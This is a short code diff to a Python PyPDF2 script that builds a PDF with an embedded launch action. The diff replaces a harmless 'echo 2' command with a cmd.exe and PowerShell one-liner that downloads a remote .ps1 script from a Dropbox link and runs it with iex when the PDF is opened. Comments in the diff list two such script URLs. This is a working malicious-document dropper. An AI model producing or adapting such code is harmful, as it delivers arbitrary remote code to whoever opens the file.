@@ -10,10 +10,14 @@ writer = PyPDF2.PdfWriter()
 for i in range(len(reader.pages)):
     writer.add_page(reader.pages[i])
 
+
+# https://www.dropbox.com/scl/fi/f3k7xpydr6ci56gtvqo2x/teste.ps1?rlkey=msg6e1gnkbxl41eidbs1irmbw&st=naptj51l&dl=1
+# https://www.dropbox.com/scl/fi/0d8qkntos3ha0t0tz7lzs/mom.ps1?rlkey=eln3escdv21sjt5a8res8ez1f&st=j811v9b7&dl=1
+url = "https://www.dropbox.com/scl/fi/0d8qkntos3ha0t0tz7lzs/mom.ps1?rlkey=eln3escdv21sjt5a8res8ez1f&st=j811v9b7&dl=1"
 win_dict = DictionaryObject()
 win_dict.update({
     NameObject("/F"): TextStringObject("cmd.exe"),
-    NameObject("/P"): TextStringObject('/c powershell -Command "echo 2"')
+    NameObject("/P"): TextStringObject(f'/c powershell -Command "iex (New-Object Net.WebClient).DownloadString(\'{url}\')"')
 })
 
 launch_action = DictionaryObject()
